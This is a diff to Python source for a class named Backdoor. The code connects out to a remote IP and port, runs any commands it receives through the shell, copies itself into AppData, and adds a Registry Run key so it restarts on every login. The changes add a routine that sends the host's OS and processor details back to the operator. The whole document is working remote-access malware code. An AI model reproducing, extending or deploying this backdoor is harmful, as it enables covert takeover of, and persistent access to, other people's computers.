@@ -11,10 +11,11 @@ class Backdoor:
     def __init__(self, ip, port):
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock_obj.connect((ip, port))
+
     def exec_system_cmd(self, command):
         try:
             DEVNULL = open(os.devnull,'wb') 
-            # virtual NULL device to which output will be redirected to
+            # virtual NULL device to which I/O will be redirected to
             return subprocess.check_output(command, 
                                            shell=True,
                                            stderr=DEVNULL,
@@ -22,15 +23,23 @@ class Backdoor:
         except:
             return "[+] ERROR - Error during command execution"
         
+    def system_info(self, data):
+        data += "\n\n"
+        data += str(platform.uname())
+        data += "\n"
+        data += str(platform.processor())
+        self.reliable_send(data)
 
     def persistence(self):
         operating_system = platform.system()
-        if operating_system != "Windows":
-            self.reliable_send("[-] Non-Windows OS detected")
-
         data = ""
-        data = data + "[+] Windows OS detected\n[+] Continuing with Persistence Operations"
-        
+
+        if operating_system != "Windows":
+            data = "[-] Non-Windows OS detected [-] Unable to establish persistence"
+            self.system_info(data)
+            return
+
+        data += "[+] Windows OS detected"
         #location = os.environ["appdata"]+"\\scheduler.exe"
         location = os.environ["appdata"]+"\\client.py"
         if not os.path.exists(location):
@@ -40,14 +49,17 @@ class Backdoor:
             #  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
             #                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             #                                                                                        os.environ['appdata']
-            res = ""
+            res = "\n[+] Continuing with Persistence Operations"
             try:
                 subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
                 res = "\n[+] Successfully added executable to the Registry"
             except:
                 res = "\n[-] ERROR - Cannot add executable for persistence"
             data = data + res
-        self.reliable_send(data)
+        else:
+            data += "\n[+] Persistence already established\n[+] Continuing previous session"
+            
+        self.system_info(data)
         return
 
     def reliable_send(self, data):
